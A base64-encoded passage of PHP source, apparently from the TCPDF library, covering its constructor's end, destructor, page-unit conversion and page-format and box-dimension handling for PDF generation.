0aGlzLT5Gb250U2l6ZVB0KSk7CgkJLy8gY2hlY2sgaWYgUENSRSBVbmljb2RlIHN1cHBvcnQgaXMgZW5hYmxlZAoJCWlmICgkdGhpcy0+aXN1bmljb2RlIEFORCAoQHByZWdfbWF0Y2goJy9ccEwvdScsICdhJykgPT0gMSkpIHsKCQkJLy8gUENSRSB1bmljb2RlIHN1cHBvcnQgaXMgdHVybmVkIE9OCgkJCS8vIFxzICAgICA6IGFueSB3aGl0ZXNwYWNlIGNoYXJhY3RlcgoJCQkvLyBccHtafSAgOiBhbnkgc2VwYXJhdG9yCgkJCS8vIFxwe0xvfSA6IFVuaWNvZGUgbGV0dGVyIG9yIGlkZW9ncmFwaCB0aGF0IGRvZXMgbm90IGhhdmUgbG93ZXJjYXNlIGFuZCB1cHBlcmNhc2UgdmFyaWFudHMuIElzIHVzZWQgdG8gY2h1bmsgY2hpbmVzZSB3b3Jkcy4KCQkJLy8gXHhhMCAgIDogVW5pY29kZSBDaGFyYWN0ZXIgJ05PLUJSRUFLIFNQQUNFJyAoVSswMEEwKQoJCQkvLyR0aGlzLT5zZXRTcGFjZXNSRSgnLyg/IVx4YTApW1xzXHB7Wn1ccHtMb31dL3UnKTsKCQkJJHRoaXMtPnNldFNwYWNlc1JFKCcvKD8hXHhhMClbXHNccHtafV0vdScpOwoJCX0gZWxzZSB7CgkJCS8vIFBDUkUgdW5pY29kZSBzdXBwb3J0IGlzIHR1cm5lZCBPRkYKCQkJJHRoaXMtPnNldFNwYWNlc1JFKCcvW15cU1x4YTBdLycpOwoJCX0KCQkkdGhpcy0+ZGVmYXVsdF9mb3JtX3Byb3AgPSBhcnJheSgnbGluZVdpZHRoJz0+MSwgJ2JvcmRlclN0eWxlJz0+J3NvbGlkJywgJ2ZpbGxDb2xvcic9PmFycmF5KDI1NSwgMjU1LCAyNTUpLCAnc3Ryb2tlQ29sb3InPT5hcnJheSgxMjgsIDEyOCwgMTI4KSk7CgkJLy8gc2V0IGRvY3VtZW50IGNyZWF0aW9uIGFuZCBtb2RpZmljYXRpb24gdGltZXN0YW1wCgkJJHRoaXMtPmRvY19jcmVhdGlvbl90aW1lc3RhbXAgPSB0aW1lKCk7CgkJJHRoaXMtPmRvY19tb2RpZmljYXRpb25fdGltZXN0YW1wID0gJHRoaXMtPmRvY19jcmVhdGlvbl90aW1lc3RhbXA7CgkJLy8gZ2V0IGRlZmF1bHQgZ3JhcGhpYyB2YXJzCgkJJHRoaXMtPmRlZmF1bHRfZ3JhcGhpY192YXJzID0gJHRoaXMtPmdldEdyYXBoaWNWYXJzKCk7CgkJJHRoaXMtPmhlYWRlcl94b2JqX2F1dG9yZXNldCA9IGZhbHNlOwoJCSR0aGlzLT5jdXN0b21feG1wID0gJyc7CgkJJHRoaXMtPmN1c3RvbV94bXBfcmRmID0gJyc7Cgl9CgoJLyoqCgkgKiBEZWZhdWx0IGRlc3RydWN0b3IuCgkgKiBAcHVibGljCgkgKiBAc2luY2UgMS41My4wLlRDMDE2CgkgKi8KCXB1YmxpYyBmdW5jdGlvbiBfX2Rlc3RydWN0KCkgewoJCS8vIGNsZWFudXAKCQkkdGhpcy0+X2Rlc3Ryb3kodHJ1ZSk7Cgl9CgoJLyoqCgkgKiBTZXQgdGhlIHVuaXRzIG9mIG1lYXN1cmUgZm9yIHRoZSBkb2N1bWVudC4KCSAqIEBwYXJhbSBzdHJpbmcgJHVuaXQgVXNlciBtZWFzdXJlIHVuaXQuIFBvc3NpYmxlIHZhbHVlcyBhcmU6PHVsPjxsaT5wdDogcG9pbnQ8L2xpPjxsaT5tbTogbWlsbGltZXRlciAoZGVmYXVsdCk8L2xpPjxsaT5jbTogY2VudGltZXRlcjwvbGk+PGxpPmluOiBpbmNoPC9saT48L3VsPjxiciAvPkEgcG9pbnQgZXF1YWxzIDEvNzIgb2YgaW5jaCwgdGhhdCBpcyB0byBzYXkgYWJvdXQgMC4zNSBtbSAoYW4gaW5jaCBiZWluZyAyLjU0IGNtKS4gVGhpcyBpcyBhIHZlcnkgY29tbW9uIHVuaXQgaW4gdHlwb2dyYXBoeTsgZm9udCBzaXplcyBhcmUgZXhwcmVzc2VkIGluIHRoYXQgdW5pdC4KCSAqIEBwdWJsaWMKCSAqIEBzaW5jZSAzLjAuMDE1ICgyMDA4LTA2LTA2KQoJICovCglwdWJsaWMgZnVuY3Rpb24gc2V0UGFnZVVuaXQoJHVuaXQpIHsKCQkkdW5pdCA9IHN0cnRvbG93ZXIoJHVuaXQpOwoJCS8vU2V0IHNjYWxlIGZhY3RvcgoJCXN3aXRjaCAoJHVuaXQpIHsKCQkJLy8gcG9pbnRzCgkJCWNhc2UgJ3B4JzoKCQkJY2FzZSAncHQnOiB7CgkJCQkkdGhpcy0+ayA9IDE7CgkJCQlicmVhazsKCQkJfQoJCQkvLyBtaWxsaW1ldGVycwoJCQljYXNlICdtbSc6IHsKCQkJCSR0aGlzLT5rID0gJHRoaXMtPmRwaSAvIDI1LjQ7CgkJCQlicmVhazsKCQkJfQoJCQkvLyBjZW50aW1ldGVycwoJCQljYXNlICdjbSc6IHsKCQkJCSR0aGlzLT5rID0gJHRoaXMtPmRwaSAvIDIuNTQ7CgkJCQlicmVhazsKCQkJfQoJCQkvLyBpbmNoZXMKCQkJY2FzZSAnaW4nOiB7CgkJCQkkdGhpcy0+ayA9ICR0aGlzLT5kcGk7CgkJCQlicmVhazsKCQkJfQoJCQkvLyB1bnN1cHBvcnRlZCB1bml0CgkJCWRlZmF1bHQgOiB7CgkJCQkkdGhpcy0+RXJyb3IoJ0luY29ycmVjdCB1bml0OiAnLiR1bml0KTsKCQkJCWJyZWFrOwoJCQl9CgkJfQoJCSR0aGlzLT5wZGZ1bml0ID0gJHVuaXQ7CgkJaWYgKGlzc2V0KCR0aGlzLT5DdXJPcmllbnRhdGlvbikpIHsKCQkJJHRoaXMtPnNldFBhZ2VPcmllbnRhdGlvbigkdGhpcy0+Q3VyT3JpZW50YXRpb24pOwoJCX0KCX0KCgkvKioKCSAqIENoYW5nZSB0aGUgZm9ybWF0IG9mIHRoZSBjdXJyZW50IHBhZ2UKCSAqIEBwYXJhbSBtaXhlZCAkZm9ybWF0IFRoZSBmb3JtYXQgdXNlZCBmb3IgcGFnZXMuIEl0IGNhbiBiZSBlaXRoZXI6IG9uZSBvZiB0aGUgc3RyaW5nIHZhbHVlcyBzcGVjaWZpZWQgYXQgZ2V0UGFnZVNpemVGcm9tRm9ybWF0KCkgZG9jdW1lbnRhdGlvbiBvciBhbiBhcnJheSBvZiB0d28gbnVtYmVycyAod2lkdGgsIGhlaWdodCkgb3IgYW4gYXJyYXkgY29udGFpbmluZyB0aGUgZm9sbG93aW5nIG1lYXN1cmVzIGFuZCBvcHRpb25zOjx1bD4KCSAqIDxsaT5bJ2Zvcm1hdCddID0gcGFnZSBmb3JtYXQgbmFtZSAob25lIG9mIHRoZSBhYm92ZSk7PC9saT4KCSAqIDxsaT5bJ1JvdGF0ZSddIDogVGhlIG51bWJlciBvZiBkZWdyZWVzIGJ5IHdoaWNoIHRoZSBwYWdlIHNoYWxsIGJlIHJvdGF0ZWQgY2xvY2t3aXNlIHdoZW4gZGlzcGxheWVkIG9yIHByaW50ZWQuIFRoZSB2YWx1ZSBzaGFsbCBiZSBhIG11bHRpcGxlIG9mIDkwLjwvbGk+CgkgKiA8bGk+WydQWiddIDogVGhlIHBhZ2UncyBwcmVmZXJyZWQgem9vbSAobWFnbmlmaWNhdGlvbikgZmFjdG9yLjwvbGk+CgkgKiA8bGk+WydNZWRpYUJveCddIDogdGhlIGJvdW5kYXJpZXMgb2YgdGhlIHBoeXNpY2FsIG1lZGl1bSBvbiB3aGljaCB0aGUgcGFnZSBzaGFsbCBiZSBkaXNwbGF5ZWQgb3IgcHJpbnRlZDo8L2xpPgoJICogPGxpPlsnTWVkaWFCb3gnXVsnbGx4J10gOiBsb3dlci1sZWZ0IHggY29vcmRpbmF0ZTwvbGk+CgkgKiA8bGk+WydNZWRpYUJveCddWydsbHknXSA6IGxvd2VyLWxlZnQgeSBjb29yZGluYXRlPC9saT4KCSAqIDxsaT5bJ01lZGlhQm94J11bJ3VyeCddIDogdXBwZXItcmlnaHQgeCBjb29yZGluYXRlPC9saT4KCSAqIDxsaT5bJ01lZGlhQm94J11bJ3VyeSddIDogdXBwZXItcmlnaHQgeSBjb29yZGluYXRlPC9saT4KCSAqIDxsaT5bJ0Nyb3BCb3gnXSA6IHRoZSB2aXNpYmxlIHJlZ2lvbiBvZiBkZWZhdWx0IHVzZXIgc3BhY2U6PC9saT4KCSAqIDxsaT5bJ0Nyb3BCb3gnXVsnbGx4J10gOiBsb3dlci1sZWZ0IHggY29vcmRpbmF0ZTwvbGk+CgkgKiA8bGk+WydDcm9wQm94J11bJ2xseSddIDogbG93ZXItbGVmdCB5IGNvb3JkaW5hdGU8L2xpPgoJICogPGxpPlsnQ3JvcEJveCddWyd1cngnXSA6IHVwcGVyLXJpZ2h0IHggY29vcmRpbmF0ZTwvbGk+CgkgKiA8bGk+WydDcm9wQm94J11bJ3VyeSddIDogdXBwZXItcmlnaHQgeSBjb29yZGluYXRlPC9saT4KCSAqIDxsaT5bJ0JsZWVkQm94J10gOiB0aGUgcmVnaW9uIHRvIHdoaWNoIHRoZSBjb250ZW50cyBvZiB0aGUgcGFnZSBzaGFsbCBiZSBjbGlwcGVkIHdoZW4gb3V0cHV0IGluIGEgcHJvZHVjdGlvbiBlbnZpcm9ubWVudDo8L2xpPgoJICogPGxpPlsnQmxlZWRCb3gnXVsnbGx4J10gOiBsb3dlci1sZWZ0IHggY29vcmRpbmF0ZTwvbGk+CgkgKiA8bGk+WydCbGVlZEJveCddWydsbHknXSA6IGxvd2VyLWxlZnQgeSBjb29yZGluYXRlPC9saT4KCSAqIDxsaT5bJ0JsZWVkQm94J11bJ3VyeCddIDogdXBwZXItcmlnaHQgeCBjb29yZGluYXRlPC9saT4KCSAqIDxsaT5bJ0JsZWVkQm94J11bJ3VyeSddIDogdXBwZXItcmlnaHQgeSBjb29yZGluYXRlPC9saT4KCSAqIDxsaT5bJ1RyaW1Cb3gnXSA6IHRoZSBpbnRlbmRlZCBkaW1lbnNpb25zIG9mIHRoZSBmaW5pc2hlZCBwYWdlIGFmdGVyIHRyaW1taW5nOjwvbGk+CgkgKiA8bGk+WydUcmltQm94J11bJ2xseCddIDogbG93ZXItbGVmdCB4IGNvb3JkaW5hdGU8L2xpPgoJICogPGxpPlsnVHJpbUJveCddWydsbHknXSA6IGxvd2VyLWxlZnQgeSBjb29yZGluYXRlPC9saT4KCSAqIDxsaT5bJ1RyaW1Cb3gnXVsndXJ4J10gOiB1cHBlci1yaWdodCB4IGNvb3JkaW5hdGU8L2xpPgoJICogPGxpPlsnVHJpbUJveCddWyd1cnknXSA6IHVwcGVyLXJpZ2h0IHkgY29vcmRpbmF0ZTwvbGk+CgkgKiA8bGk+WydBcnRCb3gnXSA6IHRoZSBleHRlbnQgb2YgdGhlIHBhZ2UncyBtZWFuaW5nZnVsIGNvbnRlbnQ6PC9saT4KCSAqIDxsaT5bJ0FydEJveCddWydsbHgnXSA6IGxvd2VyLWxlZnQgeCBjb29yZGluYXRlPC9saT4KCSAqIDxsaT5bJ0FydEJveCddWydsbHknXSA6IGxvd2VyLWxlZnQgeSBjb29yZGluYXRlPC9saT4KCSAqIDxsaT5bJ0FydEJveCddWyd1cngnXSA6IHVwcGVyLXJpZ2h0IHggY29vcmRpbmF0ZTwvbGk+CgkgKiA8bGk+WydBcnRCb3gnXVsndXJ5J10gOiB1cHBlci1yaWdodCB5IGNvb3JkaW5hdGU8L2xpPgoJICogPGxpPlsnQm94Q29sb3JJbmZvJ10gOnNwZWNpZnkgdGhlIGNvbG91cnMgYW5kIG90aGVyIHZpc3VhbCBjaGFyYWN0ZXJpc3RpY3MgdGhhdCBzaG91bGQgYmUgdXNlZCBpbiBkaXNwbGF5aW5nIGd1aWRlbGluZXMgb24gdGhlIHNjcmVlbiBmb3IgZWFjaCBvZiB0aGUgcG9zc2libGUgcGFnZSBib3VuZGFyaWVzIG90aGVyIHRoYW4gdGhlIE1lZGlhQm94OjwvbGk+CgkgKiA8bGk+WydCb3hDb2xvckluZm8nXVtCT1hUWVBFXVsnQyddIDogYW4gYXJyYXkgb2YgdGhyZWUgbnVtYmVycyBpbiB0aGUgcmFuZ2UgMC0yNTUsIHJlcHJlc2VudGluZyB0aGUgY29tcG9uZW50cyBpbiB0aGUgRGV2aWNlUkdCIGNvbG91ciBzcGFjZS48L2xpPgoJICogPGxpPlsnQm94Q29sb3JJbmZvJ11bQk9YVFlQRV1bJ1cnXSA6IHRoZSBndWlkZWxpbmUgd2lkdGggaW4gZGVmYXVsdCB1c2VyIHVuaXRzPC9saT4KCSAqIDxsaT5bJ0JveENvbG9ySW5mbyddW0JPWFRZUEVdWydTJ10gOiB0aGUgZ3VpZGVsaW5lIHN0eWxlOiBTID0gU29saWQ7IEQgPSBEYXNoZWQ8L2xpPgoJICogPGxpPlsnQm94Q29sb3JJbmZvJ11bQk9YVFlQRV1bJ0QnXSA6IGRhc2ggYXJyYXkgZGVmaW5pbmcgYSBwYXR0ZXJuIG9mIGRhc2hlcyBhbmQgZ2FwcyB0byBiZSB1c2VkIGluIGRyYXdpbmcgZGFzaGVkIGd1aWRlbGluZXM8L2xpPgoJICogPGxpPlsndHJhbnMnXSA6IHRoZSBzdHlsZSBhbmQgZHVyYXRpb24gb2YgdGhlIHZpc3VhbCB0cmFuc2l0aW9uIHRvIHVzZSB3aGVuIG1vdmluZyBmcm9tIGFub3RoZXIgcGFnZSB0byB0aGUgZ2l2ZW4gcGFnZSBkdXJpbmcgYSBwcmVzZW50YXRpb248L2xpPgoJICogPGxpPlsndHJhbnMnXVsnRHVyJ10gOiBUaGUgcGFnZSdzIGRpc3BsYXkgZHVyYXRpb24gKGFsc28gY2FsbGVkIGl0cyBhZHZhbmNlIHRpbWluZyk6IHRoZSBtYXhpbXVtIGxlbmd0aCBvZiB0aW1lLCBpbiBzZWNvbmRzLCB0aGF0IHRoZSBwYWdlIHNoYWxsIGJlIGRpc3BsYXllZCBkdXJpbmcgcHJlc2VudGF0aW9ucyBiZWZvcmUgdGhlIHZpZXdlciBhcHBsaWNhdGlvbiBzaGFsbCBhdXRvbWF0aWNhbGx5IGFkdmFuY2UgdG8gdGhlIG5leHQgcGFnZS48L2xpPgoJICogPGxpPlsndHJhbnMnXVsnUyddIDogdHJhbnNpdGlvbiBzdHlsZSA6IFNwbGl0LCBCbGluZHMsIEJveCwgV2lwZSwgRGlzc29sdmUsIEdsaXR0ZXIsIFIsIEZseSwgUHVzaCwgQ292ZXIsIFVuY292ZXIsIEZhZGU8L2xpPgoJICogPGxpPlsndHJhbnMnXVsnRCddIDogVGhlIGR1cmF0aW9uIG9mIHRoZSB0cmFuc2l0aW9uIGVmZmVjdCwgaW4gc2Vjb25kcy48L2xpPgoJICogPGxpPlsndHJhbnMnXVsnRG0nXSA6IChTcGxpdCBhbmQgQmxpbmRzIHRyYW5zaXRpb24gc3R5bGVzIG9ubHkpIFRoZSBkaW1lbnNpb24gaW4gd2hpY2ggdGhlIHNwZWNpZmllZCB0cmFuc2l0aW9uIGVmZmVjdCBzaGFsbCBvY2N1cjogSCA9IEhvcml6b250YWwsIFYgPSBWZXJ0aWNhbC4gRGVmYXVsdCB2YWx1ZTogSC48L2xpPgoJICogPGxpPlsndHJhbnMnXVsnTSddIDogKFNwbGl0LCBCb3ggYW5kIEZseSB0cmFuc2l0aW9uIHN0eWxlcyBvbmx5KSBUaGUgZGlyZWN0aW9uIG9mIG1vdGlvbiBmb3IgdGhlIHNwZWNpZmllZCB0cmFuc2l0aW9uIGVmZmVjdDogSSA9IElud2FyZCBmcm9tIHRoZSBlZGdlcyBvZiB0aGUgcGFnZSwgTyA9IE91dHdhcmQgZnJvbSB0aGUgY2VudGVyIG9mIHRoZSBwYWdlRGVmYXVsdCB2YWx1ZTogSS48L2xpPgoJICogPGxpPlsndHJhbnMnXVsnRGknXSA6IChXaXBlLCBHbGl0dGVyLCBGbHksIENvdmVyLCBVbmNvdmVyIGFuZCBQdXNoIHRyYW5zaXRpb24gc3R5bGVzIG9ubHkpIFRoZSBkaXJlY3Rpb24gaW4gd2hpY2ggdGhlIHNwZWNpZmllZCB0cmFuc2l0aW9uIGVmZmVjdCBzaGFsbCBtb3ZlcywgZXhwcmVzc2VkIGluIGRlZ3JlZXMgY291bnRlcmNsb2Nrd2lzZSBzdGFydGluZyBmcm9tIGEgbGVmdC10by1yaWdodCBkaXJlY3Rpb24uIElmIHRoZSB2YWx1ZSBpcyBhIG51bWJlciwgaXQgc2hhbGwgYmUgb25lIG9mOiAwID0gTGVmdCB0byByaWdodCwgOTAgPSBCb3R0b20gdG8gdG9wIChXaXBlIG9ubHkpLCAxODAgPSBSaWdodCB0byBsZWZ0IChXaXBlIG9ubHkpLCAyNzAgPSBUb3AgdG8gYm90dG9tLCAzMTUgPSBUb3AtbGVmdCB0byBib3R0b20tcmlnaHQgKEdsaXR0ZXIgb25seSkuIElmIHRoZSB2YWx1ZSBpcyBhIG5hbWUsIGl0IHNoYWxsIGJlIE5vbmUsIHdoaWNoIGlzIHJlbGV2YW50IG9ubHkgZm9yIHRoZSBGbHkgdHJhbnNpdGlvbiB3aGVuIHRoZSB2YWx1ZSBvZiBTUyBpcyBub3QgMS4wLiBEZWZhdWx0IHZhbHVlOiAwLjwvbGk+CgkgKiA8bGk+Wyd0cmFucyddWydTUyddIDogKEZseSB0cmFuc2l0aW9uIHN0eWxlIG9ubHkpIFRoZSBzdGFydGluZyBvciBlbmRpbmcgc2NhbGUgYXQgd2hpY2ggdGhlIGNoYW5nZXMgc2hhbGwgYmUgZHJhd24uIElmIE0gc3BlY2lmaWVzIGFuIGlud2FyZCB0cmFuc2l0aW9uLCB0aGUgc2NhbGUgb2YgdGhlIGNoYW5nZXMgZHJhd24gc2hhbGwgcHJvZ3Jlc3MgZnJvbSBTUyB0byAxLjAgb3ZlciB0aGUgY291cnNlIG9mIHRoZSB0cmFuc2l0aW9uLiBJZiBNIHNwZWNpZmllcyBhbiBvdXR3YXJkIHRyYW5zaXRpb24sIHRoZSBzY2FsZSBvZiB0aGUgY2hhbmdlcyBkcmF3biBzaGFsbCBwcm9ncmVzcyBmcm9tIDEuMCB0byBTUyBvdmVyIHRoZSBjb3Vyc2Ugb2YgdGhlIHRyYW5zaXRpb24uIERlZmF1bHQ6IDEuMC48L2xpPgoJICogPGxpPlsndHJhbnMnXVsnQiddIDogKEZseSB0cmFuc2l0aW9uIHN0eWxlIG9ubHkpIElmIHRydWUsIHRoZSBhcmVhIHRoYXQgc2hhbGwgYmUgZmxvd24gaW4gaXMgcmVjdGFuZ3VsYXIgYW5kIG9wYXF1ZS4gRGVmYXVsdDogZmFsc2UuPC9saT4KCSAqIDwvdWw+CgkgKiBAcGFyYW0gc3RyaW5nICRvcmllbnRhdGlvbiBwYWdlIG9yaWVudGF0aW9uLiBQb3NzaWJsZSB2YWx1ZXMgYXJlIChjYXNlIGluc2Vuc2l0aXZlKTo8dWw+CgkgKiA8bGk+UCBvciBQb3J0cmFpdCAoZGVmYXVsdCk8L2xpPgoJICogPGxpPkwgb3IgTGFuZHNjYXBlPC9saT4KCSAqIDxsaT4nJyAoZW1wdHkgc3RyaW5nKSBmb3IgYXV0b21hdGljIG9yaWVudGF0aW9uPC9saT4KCSAqIDwvdWw+CgkgKiBAcHJvdGVjdGVkCgkgKiBAc2luY2UgMy4wLjAxNSAoMjAwOC0wNi0wNikKCSAqIEBzZWUgZ2V0UGFnZVNpemVGcm9tRm9ybWF0KCkKCSAqLwoJcHJvdGVjdGVkIGZ1bmN0aW9uIHNldFBhZ2VGb3JtYXQoJGZvcm1hdCwgJG9yaWVudGF0aW9uPSdQJykgewoJCWlmICghZW1wdHkoJGZvcm1hdCkgQU5EIGlzc2V0KCR0aGlzLT5wYWdlZGltWyR0aGlzLT5wYWdlXSkpIHsKCQkJLy8gcmVtb3ZlIGluaGVyaXRlZCB2YWx1ZXMKCQkJdW5zZXQoJHRoaXMtPnBhZ2VkaW1bJHRoaXMtPnBhZ2VdKTsKCQl9CgkJaWYgKGlzX3N0cmluZygkZm9ybWF0KSkgewoJCQkvLyBnZXQgcGFnZSBtZWFzdXJlcyBmcm9tIGZvcm1hdCBuYW1lCgkJCSRwZiA9IFRDUERGX1NUQVRJQzo6Z2V0UGFnZVNpemVGcm9tRm9ybWF0KCRmb3JtYXQpOwoJCQkkdGhpcy0+ZndQdCA9ICRwZlswXTsKCQkJJHRoaXMtPmZoUHQgPSAkcGZbMV07CgkJfSBlbHNlIHsKCQkJLy8gdGhlIGJvdW5kYXJpZXMgb2YgdGhlIHBoeXNpY2FsIG1lZGl1bSBvbiB3aGljaCB0aGUgcGFnZSBzaGFsbCBiZSBkaXNwbGF5ZWQgb3IgcHJpbnRlZAoJCQlpZiAoaXNzZXQoJGZvcm1hdFsnTWVkaWFCb3gnXSkpIHsKCQkJCSR0aGlzLT5wYWdlZGltID0gVENQREZfU1RBVElDOjpzZXRQYWdlQm94ZXMoJHRoaXMtPnBhZ2UsICdNZWRpYUJveCcsICRmb3JtYXRbJ01lZGlhQm94J11bJ2xseCddLCAkZm9ybWF0WydNZWRpYUJveCddWydsbHknXSwgJGZvcm1hdFsnTWVkaWFCb3gnXVsndXJ4J10sICRmb3JtYXRbJ01lZGlhQm94J11bJ3VyeSddLCBmYWxzZSwgJHRoaXMtPmssICR0aGlzLT5wYWdlZGltKTsKCQkJCSR0aGlzLT5md1B0ID0gKCgkZm9ybWF0WydNZWRpYUJveCddWyd1cngnXSAtICRmb3JtYXRbJ01lZGlhQm94J11bJ2xseCddKSAqICR0aGlzLT5rKTsKCQkJCSR0aGlzLT5maFB0ID0gKCgkZm9ybWF0WydNZWRpYUJveCddWyd1cnknXSAtICRmb3JtYXRbJ01lZGlhQm94J11bJ2xseSddKSAqICR0aGlzLT5rKTsKCQkJfSBlbHNlIHsKCQkJCWlmIChpc3NldCgkZm9ybWF0WzBdKSBBTkQgaXNfbnVtZXJpYygkZm9ybWF0WzBdKSBBTkQgaXNzZXQoJGZvcm1hdFsxXSkgQU5EIGlzX251bWVyaWMoJGZvcm1hdFsxXSkpIHsKCQkJCQkkcGYgPSBhcnJheSgoJGZvcm1hdFswXSAqICR0aGlzLT5rKSwgKCRmb3JtYXRbMV0gKiAkdGhpcy0+aykpOwoJCQkJfSBlbHNlIHsKCQkJCQlpZiAoIWlzc2V0KCRmb3JtYXRbJ2Zvcm1hdCddKSkgewoJCQkJCQkvLyBkZWZhdWx0IHZhbHVlCgkJCQkJCSRmb3JtYXRbJ2Zvcm1hdCddID0gJ0E0JzsKCQkJCQl9CgkJCQkJJHBmID0gVENQREZfU1RBVElDOjpnZXRQYWdlU2l6ZUZyb21Gb3JtYXQoJGZvcm1hdFsnZm9ybWF0J10pOwoJCQkJfQoJCQkJJHRoaXMtPmZ3UHQgPSAkcGZbMF07CgkJCQkkdGhpcy0+ZmhQdCA9ICRwZlsxXTsKCQkJCSR0aGlzLT5wYWdlZGltID0gVENQREZfU1RBVElDOjpzZXRQYWdlQm94ZXMoJHRoaXMtPnBhZ2UsICdNZWRpYUJveCcsIDAsIDAsICR0aGlzLT5md1B0LCAkdGhpcy0+ZmhQdCwgdHJ1ZSwgJHRoaXMtPmssICR0aGlzLT5wYWdlZGltKTsKCQkJfQoJCQkvLyB0aGUgdmlzaWJsZSByZWdpb24gb2YgZGVmYXVsdCB1c2VyIHNwYWNlCgkJCWlmIChpc3NldCgkZm9ybWF0WydDcm9wQm94J10pKSB7CgkJCQkkdGhpcy0+cGFnZWRpbSA9IFRDUERGX1NUQVRJQzo6c2V0UGFnZUJveGVzKCR0aGlzLT5wYWdlLCAnQ3JvcEJveCcsICRmb3JtYXRbJ0Nyb3BCb3gnXVsnbGx4J10sICRmb3JtYXRbJ0Nyb3BCb3gnXVsnbGx5J10sICRmb3JtYXRbJ0Nyb3BCb3gnXVsndXJ4J10sICRmb3JtYXRbJ0Nyb3BCb3gnXVsndXJ5J10sIGZhbHNlLCAkdGhpcy0+aywgJHRoaXMtPnBhZ2VkaW0pOwoJCQl9CgkJCS8vIHRoZSByZWdpb24gdG8gd2hpY2ggdGhlIGNvbnRlbnRzIG9mIHRoZSBwYWdlIHNoYWxsIGJlIGNsaXBwZWQgd2hlbiBvdXRwdXQgaW4gYSBwcm9kdWN0aW9uIGVudmlyb25tZW50CgkJCWlmIChpc3NldCgkZm9ybWF0WydCbGVlZEJveCddKSkgewoJCQkJJHRoaXMtPnBhZ2VkaW0gPSBUQ1BERl9TVEFUSUM6OnNldFBhZ2VCb3hlcygkdGhpcy0+cGFnZSwgJ0JsZWVkQm94JywgJGZvcm1hdFsnQmxlZWRCb3gnXVsnbGx4J10sICRmb3JtYXRbJ0JsZWVkQm94J11bJ2xseSddLCAkZm9ybWF0WydCbGVlZEJveCddWyd1cngnXSwgJGZvcm1hdFsnQmxlZWRCb3gnXVsndXJ5J10sIGZhbHNlLCAkdGhpcy0+aywgJHRoaXMtPnBhZ2VkaW0pOwoJCQl9CgkJCS8vIHRoZSBpbnRlbmRlZCBkaW1lbnNpb25zIG9mIHRoZSBmaW5pc2hlZCBwYWdlIGFmdGVyIHRyaW1taW5nCgkJCWlmIChpc3NldCgkZm9ybWF0WydUcmltQm94J10pKSB7CgkJCQkkdGhpcy0+cGFnZWRpbSA9IFRDUERGX1NUQVRJQzo6c2V0UGFnZUJveGVzKCR0aGlzLT5wYWdlLCAnVHJpbUJveCcsICRmb3JtYXRbJ1RyaW1Cb3gnXVsnbGx4J10sICRmb3JtYXRbJ1RyaW1Cb3gnXVsnbGx5J10sICRmb3JtYXRbJ1RyaW1Cb3gnXVsndXJ4J10sICRmb3JtYXRbJ1RyaW1Cb3gnXVsndXJ5J10sIGZhbHNlLCAkdGhpcy0+aywgJHRoaXMtPnBhZ2VkaW0pOwoJCQl9CgkJCS8vIHRoZSBwYWdlJ3MgbWVhbmluZ2Z1bCBjb250ZW50IChpbmNsdWRpbmcgcG90ZW50aWFsIHdoaXRlIHNwYWNlKQoJCQlpZiAoaXNzZXQoJGZvcm1hdFsnQXJ0Qm94J10pKSB7CgkJCQkkdGhpcy0+cGFnZWRpbSA9IFRDUERGX1NUQVRJQzo6c2V0UGFnZUJveGVzKCR0aGlzLT5wYWdlLCAnQXJ0Qm94JywgJGZvcm1hdFsnQXJ0Qm94J11bJ2xseCddLCAkZm9ybWF0WydBcnRCb3gnXVsnbGx5J10sICRmb3JtYXRbJ0FydEJveCddWyd1cngnXSwgJGZvcm1hdFsnQXJ0Qm94J11bJ3VyeSddLCBmYWxzZSwgJHRoaXMtPmssICR0aGlzLT5wYWdlZGltKTsKCQkJfQoJCQkvLyBzcGVjaWZ5IHRoZSBjb2xvdXJzIGFuZCBvdGhlciB2aXN1YWwgY2hhcmFjdGVyaXN0aWNzIHRoYXQgc2hvdWxkIGJlIHVzZWQgaW4gZGlzcGxheWluZyBndWlkZWxpbmVzIG9uIHRoZSBzY3JlZW4gZm9yIHRoZSB2YXJpb3VzIHBhZ2UgYm91bmRhcmllcwoJCQlpZiAoaXNzZXQoJGZvcm1hdFsnQm94Q29sb3JJbmZvJ10pKSB7CgkJCQkkdGhpcy0+cGFnZWRpbVskdGhpcy0+cGFnZV1bJ0JveENvbG9ySW5mbyddID0gJGZvcm1hdFsnQm94Q29sb3JJbmZvJ107CgkJCX0KCQkJaWYgKGlzc2V0KCRmb3JtYXRbJ1JvdGF0ZSddKSBBTkQgKCgkZm9ybWF0WydSb3RhdGUnXSAlIDkwKSA9PSAwKSkgewoJCQkJLy8gVGhlIG51bWJlciBvZiBkZWdyZWVzIGJ5IHdoaWNoIHRoZSBwYWdlIHNoYWxsIGJlIHJvdGF0ZWQgY2xvY2t3aXNlIHdoZW4gZGlzcGxheWVkIG9yIHByaW50ZWQuIFRoZSB2YWx1ZSBzaGFsbCBiZSBhIG11bHRpcGxlIG9mIDkwLgoJCQkJJHRoaXMtPnBhZ2VkaW1bJHRoaXMtPnBhZ2VdWydSb3RhdGUnXSA9IGludHZhbCgkZm9ybWF0WydSb3RhdGUnXSk7CgkJCX0KCQkJaWYgKGlzc2V0KCRmb3JtYXRbJ1BaJ10pKSB7CgkJCQkvLyBUaGUgcGFnZSdzIHByZWZlcnJlZCB6b29tIChtYWduaWZpY2F0aW9uKSBmYWN0b3IKCQkJCSR0aGlzLT5wYWdlZGltWyR0aGlzLT5wYWdlXVsnUFonXSA9IGZsb2F0dmFsKCRmb3JtYXRbJ1BaJ10pOwoJCQl9CgkJCWlmIChpc3NldCgkZm9ybWF0Wyd0cmFucyddKSkgewoJCQkJLy8gVGhlIHN0eWxlIGFuZCBkdXJhdGlvbiBvZiB0aGUgdmlzdWFsIHRyYW5zaXRpb24gdG8gdXNlIHdoZW4gbW92aW5nIGZyb20gYW5vdGhlciBwYWdlIHRvIHRoZSBnaXZlbiBwYWdlIGR1cmluZyBhIHByZXNlbnRhdGlvbgoJCQkJaWYgKGlzc2V0KCRmb3JtYXRbJ3RyYW5zJ11bJ0R1ciddKSkgewoJCQkJCS8vIFRoZSBwYWdlJ3MgZGlzcGxheSBkdXJhdGlvbgoJCQkJCSR0aGlzLT5wYWdlZGltWyR0aGlzLT5wYWdlXVsndHJhbnMnXVsnRHVyJ10gPSBmbG9hdHZhbCgkZm9ybWF0Wyd0cmFucyddWydEdXInXSk7CgkJCQl9CgkJCQkkc3RhbnNpdGlvbl9zdHlsZXMgPSBhcnJheSgnU3BsaXQnLCAnQmxpbmRzJywgJ0JveCcsICdXaXBlJywgJ0Rpc3NvbHZlJywgJ0d